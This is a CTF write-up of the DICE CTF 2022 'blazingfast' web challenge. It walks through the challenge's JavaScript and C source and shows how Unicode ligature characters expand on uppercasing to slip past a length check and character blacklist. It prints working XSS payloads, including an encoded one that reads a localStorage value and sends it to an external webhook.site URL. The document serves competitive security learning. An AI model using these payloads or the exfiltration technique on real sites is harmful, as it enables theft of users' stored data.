---
title: DICE CTF 2022 – blazingfast
date: '2022-02-06'
draft: false
authors: ['thebish0p']
tags: ['DICE CTF 2022', 'Web', 'XSS', 'Unicode']
summary: 'Bypassing length limitation with unicode'
---

## blazingfast

> by larry
>
> I made a blazing fast MoCkInG CaSe converter!
>
> [blazingfast.mc.ax](blazingfast.mc.ax)
>
> [Admin Bot](https://admin-bot.mc.ax/blazingfast)
>
> Downloads
>
> [blazingfast.tar](https://static.dicega.ng/uploads/c37db76fc7e66f32dee53b48652868aefd79193c1b5936e1f2441e3c70cfcdfa/blazingfast.tar)
>
> [admin-bot.js](https://static.dicega.ng/uploads/1286aac5ffb57d27c1dc1e0221c7c3691e575181720449df62dff67d10ec6749/admin-bot.js)
>
> [blazingfast.c](https://static.dicega.ng/uploads/209c5168fc160763f28a23f23280f921c7e544fb87323726e48584b89d774825/blazingfast.c)

We start by noticing that we have a challenge link and an admin bot link which means this challenge is an XSS challenge. We start with browsing the website and testing it’s normal behaviour as shown below:

![website.png](/static/images/dice-ctf-2022/blazing-fast/website.png)

Moving to the source code, we start by analyzing `index.html`:

```javascript
let blazingfast = null

function mock(str) {
  blazingfast.init(str.length)

  if (str.length >= 1000) return 'Too long!'

  for (let c of str.toUpperCase()) {
    if (c.charCodeAt(0) > 128) return 'Nice try.'
    blazingfast.write(c.charCodeAt(0))
  }

  if (blazingfast.mock() == 1) {
    return 'No XSS for you!'
  } else {
    let mocking = '',
      buf = blazingfast.read()

    while (buf != 0) {
      mocking += String.fromCharCode(buf)
      buf = blazingfast.read()
    }

    return mocking
  }
}

function demo(str) {
  document.getElementById('result').innerHTML = mock(str)
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {
  blazingfast = instance.exports

  document.getElementById('demo-submit').onclick = () => {
    demo(document.getElementById('demo').value)
  }

  let query = new URLSearchParams(window.location.search).get('demo')

  if (query) {
    document.getElementById('demo').value = query
    demo(query)
  }
})
```

As you can see, we can input data in the `demo` parameter and the data provided will be processed by `blazingfast.mock()` which is originating from the `blazingfast.c` provided:

```C
int length, ptr = 0;
char buf[1000];

void init(int size) {
	length = size;
	ptr = 0;
}

char read() {
	return buf[ptr++];
}

void write(char c) {
	buf[ptr++] = c;
}

int mock() {
	for (int i = 0; i < length; i ++) {
		if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
			buf[i] += 32;
		}

		if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
			return 1;
		}
	}

	ptr = 0;

	return 0;
}
```

Several checks are made on our input. Our input can’t be more than 1000 characters and a few characters are blacklisted : [`<`, `>`, `&`, `"`].

> After a lot of trial and error we had an idea that in order to bypass these checks and execute our JavaScript payloads we need to bypass the 1000 characters.

![too_long](/static/images/dice-ctf-2022/blazing-fast/too_long.png)

We stumbled upon an article talking about [Exploiting XSS with 20 characters limitation](https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html) by using unicode characters. In this article, the author gives us a great example :

> Notice that ﬀ characters is only one character but when browsers interpret it, it will be expanded as ff two characters.

We proceed by testing this idea by sending around 600 `ﬀ` which would unpack to 1200 characters. We don’t get any error as shown below:

![No Error](/static/images/dice-ctf-2022/blazing-fast/no_error.png)

We proceed by using this technique and adding to it our XSS payload to see if we can pop an alert:

```
 ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=alert(1)>
```

To our surprise, we get an error `ALERT is not defined`:

![ALERT_ERROR](/static/images/dice-ctf-2022/blazing-fast/ALERT_ERROR.png)

The issue here is that all our payload will be in upper case letters. We came up with a workaround by using XML encoding followed by URL encoding as following:

```
 ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

And we popped an alert !
![XSS Alert](/static/images/dice-ctf-2022/blazing-fast/alert_pop.png)

We continue by crafting a payload to extract the flag and send it back to our webhook.

```
<img src=x onerror=location.href='https://webhook.site/38689352-bda5-4841-80e3-4a48e1655deb?q='.toLowerCase()+localStorage.getItem('flag'.toLowerCase())>
```

After XML and URL encoding our input we send it to the admin bot as shown below:

```
ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=&#X6c;&#X6f;&#X63;&#X61;&#X74;&#X69;&#X6f;&#X6e;.&#X68;&#X72;&#X65;&#X66;=&#X27;https://webhook.site/38689352-bda5-4841-80e3-4a48e1655deb?q=&#X27.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;()&#X2B;&#X6c;&#X6f;&#X63;&#X61;&#X6c;&#X53;&#X74;&#X6f;&#X72;&#X61;&#X67;&#X65;.&#X67;&#X65;&#X74;&#X49;&#X74;&#X65;&#X6d;(&#X27;flag&#X27;.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;())>
```

Finally we receive our flag from the server :

![SUCCESS](/static/images/dice-ctf-2022/blazing-fast/flag.png)
